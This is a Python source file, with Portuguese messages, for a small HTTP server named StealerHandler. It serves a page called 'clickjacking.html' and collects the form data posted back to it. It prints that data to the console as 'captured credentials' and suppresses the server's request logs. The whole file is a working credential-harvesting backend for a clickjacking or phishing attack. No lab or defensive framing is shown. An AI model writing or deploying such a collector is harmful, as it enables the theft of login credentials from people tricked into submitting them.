from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os

HTML_FILENAME = "clickjacking.html"

class StealerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == f"/{HTML_FILENAME}":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            try:
                with open(HTML_FILENAME, 'rb') as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.wfile.write(b"<h1>Arquivo HTML nao encontrado</h1>")
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"<h1>404 - Not Found</h1>")

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8')
        parsed = urllib.parse.parse_qs(body)

        print("\n CREDENCIAIS CAPTURADAS:")
        for k, v in parsed.items():
            print(f"{k}: {v[0]}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h1>Credenciais recebidas com sucesso</h1>")

    def log_message(self, format, *args):
        return  # silencia logs padrão

if __name__ == "__main__":
    print(f" Servidor rodando em http://0.0.0.0:9090/{HTML_FILENAME}")
    HTTPServer(('0.0.0.0', 9090), StealerHandler).serve_forever()
